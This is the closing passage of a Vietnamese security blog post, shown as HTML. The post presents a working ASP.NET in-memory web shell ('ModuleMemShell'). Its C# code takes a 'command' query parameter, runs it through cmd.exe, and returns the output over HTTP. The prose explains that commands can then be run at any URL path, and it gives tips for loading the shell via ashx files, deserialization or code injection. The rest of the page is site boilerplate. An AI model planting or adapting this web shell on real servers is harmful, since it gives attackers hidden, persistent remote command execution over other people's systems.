+</span></span><span class=line><span class=cl>            <span class=n>String</span> <span class=n>cmd</span> <span class=p>=</span> <span class=n>context</span><span class=p>.</span><span class=n>Request</span><span class=p>.</span><span class=n>QueryString</span><span class=p>[</span><span class=s>&#34;command&#34;</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=n>cmd</span> <span class=p>!=</span> <span class=kc>null</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>                <span class=n>Process</span> <span class=n>p</span> <span class=p>=</span> <span class=k>new</span> <span class=n>Process</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>                <span class=n>p</span><span class=p>.</span><span class=n>StartInfo</span><span class=p>.</span><span class=n>FileName</span> <span class=p>=</span> <span class=s>&#34;cmd.exe&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>                <span class=n>p</span><span class=p>.</span><span class=n>StartInfo</span><span class=p>.</span><span class=n>Arguments</span> <span class=p>=</span> <span class=s>&#34;/c&#34;</span> <span class=p>+</span> <span class=n>cmd</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>                <span class=n>p</span><span class=p>.</span><span class=n>StartInfo</span><span class=p>.</span><span class=n>UseShellExecute</span> <span class=p>=</span> <span class=kc>false</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>                <span class=n>p</span><span class=p>.</span><span class=n>StartInfo</span><span class=p>.</span><span class=n>RedirectStandardOutput</span> <span class=p>=</span> <span class=kc>true</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>                <span class=n>p</span><span class=p>.</span><span class=n>StartInfo</span><span class=p>.</span><span class=n>RedirectStandardError</span> <span class=p>=</span> <span class=kc>true</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>                <span class=n>p</span><span class=p>.</span><span class=n>Start</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>                <span class=kt>byte</span><span class=p>[]</span> <span class=n>data</span> <span class=p>=</span> <span class=n>Encoding</span><span class=p>.</span><span class=n>UTF8</span><span class=p>.</span><span class=n>GetBytes</span><span class=p>(</span><span class=n>p</span><span class=p>.</span><span class=n>StandardOutput</span><span class=p>.</span><span class=n>ReadToEnd</span><span class=p>()</span> <span class=p>+</span> <span class=n>p</span><span class=p>.</span><span class=n>StandardError</span><span class=p>.</span><span class=n>ReadToEnd</span><span class=p>());</span>
+</span></span><span class=line><span class=cl>                <span class=n>context</span><span class=p>.</span><span class=n>Response</span><span class=p>.</span><span class=n>Write</span><span class=p>(</span><span class=n>Encoding</span><span class=p>.</span><span class=n>Default</span><span class=p>.</span><span class=n>GetString</span><span class=p>(</span><span class=n>data</span><span class=p>));</span>
+</span></span><span class=line><span class=cl>            <span class=p>}</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=n>script</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>&lt;%</span>
+</span></span><span class=line><span class=cl>    <span class=k>new</span> <span class=n>ModuleMemShell</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=p>%&gt;</span>
+</span></span></code></pre></td></tr></table></div></div><p>Cuối cùng là exec command tại đường dẫn bất kỳ:<br><img src=https://hackmd.io/_uploads/HJBS9psS-g.png loading=lazy alt=image><br>Có một lưu ý như sau: Khi load memshell này bằng file ashx hoặc deser, code inject thì cần sửa đổi handler_name cho phù hợp để code mình có thể xóa được đúng event, tại đây mình đang ví dụ load memshell code bằng file aspx.</p></section><footer class=article-footer><section class=article-tags><a href=/tags/dotnet/>DotNet</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
+<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><div class=disqus-container><div id=disqus_thread></div><script>window.disqus_config=function(){},function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById("disqus_thread").innerHTML="Disqus comments not available by default when the website is previewed locally.";return}var t=document,e=t.createElement("script");e.async=!0,e.src="//hugo-theme-stack.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),(t.head||t.body).appendChild(e)}()</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></div><style>.disqus-container{background-color:var(--card-background);border-radius:var(--card-border-radius);box-shadow:var(--shadow-l1);padding:var(--card-padding)}</style><script>window.addEventListener("onColorSchemeChange",e=>{typeof DISQUS=="object"&&DISQUS.reset({reload:!0})})</script><footer class=site-footer><section class=copyright>&copy;
+2020 -
+2026 kev1n's Blog</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.33.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+<button class="pswp__button pswp__button--share" title=Share></button>
+<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+</button>
+<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.c922af694cc257bf1ecc41c0dd7b0430f9114ec280ccf67cd2c6ad55f5316c4e.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>
